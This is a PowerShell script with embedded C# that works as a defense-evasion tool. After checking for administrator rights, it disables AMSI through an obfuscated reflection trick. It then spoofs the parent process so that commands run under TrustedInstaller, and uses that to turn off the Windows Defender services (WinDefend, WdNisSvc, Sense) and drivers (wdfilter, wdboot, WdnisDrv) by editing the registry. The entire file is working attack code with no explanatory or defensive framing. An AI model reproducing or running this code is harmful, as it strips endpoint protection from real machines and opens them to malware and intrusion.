function BravoFour {
    if (-Not ([Security.Principal.WindowsIdentity]::GetCurrent().Groups -match "S-1-5-32-544")) {
        Write-Host "Not running as Administrator!!"
        return    
    }
    
    # AMSI Bypass
    Write-Host "[+] Disabling AMSI" -ForegroundColor Green
    Write-Host
    $a=[Ref].Assembly.GetTypes()
    Foreach($b in $a) {if ($b.Name -like "*iUtils") {$c=$b}}
    $d=$c.GetFields('NonPublic,Static')
    Foreach($e in $d) {if ($e.Name -like "*InitFailed") {$f=$e}}
    $g=$f.SetValue($null,$true)
     
    # Disabling defender services and drivers
    $spawnPPID = @"
    using System;
    using System.Runtime.InteropServices;
    
    namespace GetTrustedInstaller
    {
        public class spawnPPID
        {
            [DllImport("kernel32.dll")]
            [return: MarshalAs(UnmanagedType.Bool)]
            static extern bool CreateProcess(string lpApplicationName, string lpCommandLine, ref SECURITY_ATTRIBUTES lpProcessAttributes, ref SECURITY_ATTRIBUTES lpThreadAttributes, bool bInheritHandles, uint dwCreationFlags, IntPtr lpEnvironment, string lpCurrentDirectory, [In] ref STARTUPINFOEX lpStartupInfo, out PROCESS_INFORMATION lpProcessInformation);
    
            [DllImport("kernel32.dll", SetLastError = true)]
            public static extern IntPtr OpenProcess(ProcessAccessFlags processAccess, bool bInheritHandle, int processId);
    
            [DllImport("kernel32.dll", SetLastError = true)]
            public static extern UInt32 WaitForSingleObject(IntPtr handle, UInt32 milliseconds);
    
            [DllImport("kernel32.dll", SetLastError = true)]
            [return: MarshalAs(UnmanagedType.Bool)]
            private static extern bool UpdateProcThreadAttribute(IntPtr lpAttributeList, uint dwFlags, IntPtr Attribute, IntPtr lpValue, IntPtr cbSize, IntPtr lpPreviousValue, IntPtr lpReturnSize);
    
            [DllImport("kernel32.dll", SetLastError = true)]
            [return: MarshalAs(UnmanagedType.Bool)]
            private static extern bool InitializeProcThreadAttributeList(IntPtr lpAttributeList, int dwAttributeCount, int dwFlags, ref IntPtr lpSize);
    
            [DllImport("kernel32.dll", SetLastError = true)]
            static extern bool SetHandleInformation(IntPtr hObject, HANDLE_FLAGS dwMask, HANDLE_FLAGS dwFlags);
    
            [DllImport("kernel32.dll", SetLastError = true)]
            static extern bool CloseHandle(IntPtr hObject);
    
            [DllImport("kernel32.dll", SetLastError = true)]
            [return: MarshalAs(UnmanagedType.Bool)]
            static extern bool DuplicateHandle(IntPtr hSourceProcessHandle, IntPtr hSourceHandle, IntPtr hTargetProcessHandle, ref IntPtr lpTargetHandle, uint dwDesiDarkRedAccess, [MarshalAs(UnmanagedType.Bool)] bool bInheritHandle, uint dwOptions);
    
            public static void Run(int parentProcessId, string binaryPath, string binaryArguments)
            {
                const int PROC_THREAD_ATTRIBUTE_PARENT_PROCESS = 0x00020000;
    
                const uint EXTENDED_STARTUPINFO_PRESENT = 0x00080000;
                const uint CREATE_NEW_CONSOLE = 0x00000010;
    
                var pInfo = new PROCESS_INFORMATION();
                var siEx = new STARTUPINFOEX();
    
                IntPtr lpValueProc = IntPtr.Zero;
                IntPtr hSourceProcessHandle = IntPtr.Zero;
                var lpSize = IntPtr.Zero;
    
                InitializeProcThreadAttributeList(IntPtr.Zero, 1, 0, ref lpSize);
                siEx.lpAttributeList = Marshal.AllocHGlobal(lpSize);
                InitializeProcThreadAttributeList(siEx.lpAttributeList, 1, 0, ref lpSize);
    
                IntPtr parentHandle = OpenProcess(ProcessAccessFlags.CreateProcess | ProcessAccessFlags.DuplicateHandle, false, parentProcessId);
    
                lpValueProc = Marshal.AllocHGlobal(IntPtr.Size);
                Marshal.WriteIntPtr(lpValueProc, parentHandle);
    
                UpdateProcThreadAttribute(siEx.lpAttributeList, 0, (IntPtr)PROC_THREAD_ATTRIBUTE_PARENT_PROCESS, lpValueProc, (IntPtr)IntPtr.Size, IntPtr.Zero, IntPtr.Zero);
    
                var ps = new SECURITY_ATTRIBUTES();
                var ts = new SECURITY_ATTRIBUTES();
                ps.nLength = Marshal.SizeOf(ps);
                ts.nLength = Marshal.SizeOf(ts);
    
                // lpCommandLine was used instead of lpApplicationName to allow for arguments to be passed
                bool ret = CreateProcess(binaryPath, binaryArguments, ref ps, ref ts, true, EXTENDED_STARTUPINFO_PRESENT | CREATE_NEW_CONSOLE, IntPtr.Zero, null, ref siEx, out pInfo);
    
                String stringPid = pInfo.dwProcessId.ToString();
                        
            }
    
            [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
            struct STARTUPINFOEX
            {
                public STARTUPINFO StartupInfo;
                public IntPtr lpAttributeList;
            }
    
            [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
            struct STARTUPINFO
            {
                public Int32 cb;
                public string lpReserved;
                public string lpDesktop;
                public string lpTitle;
                public Int32 dwX;
                public Int32 dwY;
                public Int32 dwXSize;
                public Int32 dwYSize;
                public Int32 dwXCountChars;
                public Int32 dwYCountChars;
                public Int32 dwFillAttribute;
                public Int32 dwFlags;
                public Int16 wShowWindow;
                public Int16 cbReserved2;
                public IntPtr lpReserved2;
                public IntPtr hStdInput;
                public IntPtr hStdOutput;
                public IntPtr hStdError;
            }
    
            [StructLayout(LayoutKind.Sequential)]
            internal struct PROCESS_INFORMATION
            {
                public IntPtr hProcess;
                public IntPtr hThread;
                public int dwProcessId;
                public int dwThreadId;
            }
    
            [StructLayout(LayoutKind.Sequential)]
            public struct SECURITY_ATTRIBUTES
            {
                public int nLength;
                public IntPtr lpSecurityDescriptor;
                [MarshalAs(UnmanagedType.Bool)]
                public bool bInheritHandle;
            }
    
            [Flags]
            public enum ProcessAccessFlags : uint
            {
                All = 0x001F0FFF,
                Terminate = 0x00000001,
                CreateThread = 0x00000002,
                VirtualMemoryOperation = 0x00000008,
                VirtualMemoryRead = 0x00000010,
                VirtualMemoryWrite = 0x00000020,
                DuplicateHandle = 0x00000040,
                CreateProcess = 0x000000080,
                SetQuota = 0x00000100,
                SetInformation = 0x00000200,
                QueryInformation = 0x00000400,
                QueryLimitedInformation = 0x00001000,
                Synchronize = 0x00100000
            }
    
            [Flags]
            enum HANDLE_FLAGS : uint
            {
                None = 0,
                INHERIT = 1,
                PROTECT_FROM_CLOSE = 2
            }
        }
    }
"@
    
    Add-Type -TypeDefinition $spawnPPID
    
    $serviceName = "TrustedInstaller" 
    
    if ($(Get-Service -Name $serviceName).Status -match "Stopped") {
        Write-Host "[i] Starting TrustedInstaller service" -ForegroundColor Green
        Write-Host
        Start-Service -Name $serviceName
    }
    
    $serviceProcessId = $(Get-Process $serviceName).Id
    Write-Host "[i] TrustedInstaller pid: $serviceProcessId" -ForegroundColor Green
    
    $powershellPath = "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"
    
    
    # Disabling defender services
    Write-Host "[+] Disable services" -ForegroundColor Green
    Write-Host
    $svc_list = @("WdNisSvc", "WinDefend", "Sense")
    foreach ($svc in $svc_list) {
        if ($(Test-Path "HKLM:\SYSTEM\CurrentControlSet\Services\$svc")) {
            Write-Host "[i] Disabling $svc" -ForegroundColor DarkRed
            $powershellArg = "-c Set-ItemProperty -Path ""HKLM:\SYSTEM\CurrentControlSet\Services\$svc"" -Name ImagePath -Value ''"
            [GetTrustedInstaller.spawnPPID]::Run($serviceProcessId, $powershellPath, $powershellArg)
        }
    }
    
    # Disabling defender drivers
    Write-Host "[+] Disable drivers" -ForegroundColor Green
    Write-Host
    $drv_list = @("WdnisDrv", "wdfilter", "wdboot")
    foreach ($drv in $drv_list) {
        if ($(Test-Path "HKLM:\SYSTEM\CurrentControlSet\Services\$drv")) {
            Write-Host "[i] Disabling $drv" -ForegroundColor DarkRed
            $powershellArg = "Set-ItemProperty -Path ""HKLM:\SYSTEM\CurrentControlSet\Services\$drv"" -Name Start -Value '4'"
            [GetTrustedInstaller.spawnPPID]::Run($serviceProcessId, $powershellPath, $powershellArg)
        }
    }
}
